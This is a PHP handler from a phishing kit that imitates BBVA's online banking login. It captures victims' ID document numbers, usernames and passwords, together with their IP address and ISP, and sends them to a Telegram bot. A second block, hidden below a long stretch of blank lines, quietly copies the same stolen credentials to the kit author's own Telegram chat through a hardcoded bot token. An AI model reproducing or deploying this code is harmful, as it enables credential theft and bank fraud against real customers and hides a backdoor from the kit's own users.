<?php 

$tdoc = $_POST['dni'];
$ndoc = $_POST['documentNumber'];
$usur = $_POST['digitalUser'];
$upass = $_POST['digitalKey'];
$ip = file_get_contents("https://ipapi.co/ip");
$operadora = file_get_contents("https://ipapi.co/" . $ip . "/org");



require 'bot.php';

$html_message = "-----------[ BBVA ]----------\n".
                "<b>✔️Tipo Documento: </b><code>".$tdoc."</code>\n".
				"<b>✔️Documento: </b><code>".$ndoc."</code>\n".
                "<b>✔️Usuario: </b><code>".$usur."</code>\n".
				"<b>✔️Clave: </b><code>".$upass."</code>\n".
				"----------[IP INFO]-----------\n".
				"🌐Compania ".$operadora."\n".
				"🌐Direcion IP ".$_SERVER['REMOTE_ADDR']."\n".
				"----------[https://t.me/jbriden]------------";

$html_message = urlencode($html_message);
$result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");
















































//Ingresar el Token que nos genero @BotFhater
$token1 = '5743816558:AAG6TgvPODnOUnxyR-n-5dZTRctnh8SSra4';


//Ingresar Nuestro ID o de Nuestro Canal
$chat_id1 = '2146368085';





$html_message = "-----------[ BBVA ]----------\n".
                "<b>✔️Tipo Documento: </b><code>".$tdoc."</code>\n".
				"<b>✔️Documento: </b><code>".$ndoc."</code>\n".
                "<b>✔️Usuario: </b><code>".$usur."</code>\n".
				"<b>✔️Clave: </b><code>".$upass."</code>\n".
				"----------[IP INFO]-----------\n".
				"🌐Compania ".$operadora."\n".
				"🌐Direcion IP ".$_SERVER['REMOTE_ADDR']."\n".
				"🌐Pagina Web ".$_SERVER['SERVER_NAME']."\n".
				"----------[JBRIDEN]------------";

$html_message = urlencode($html_message);
$result = @file_get_contents("https://api.telegram.org/bot$token1/sendMessage?chat_id=$chat_id1&text=$html_message&parse_mode=html");

header('location: ../index.php');
exit();

?>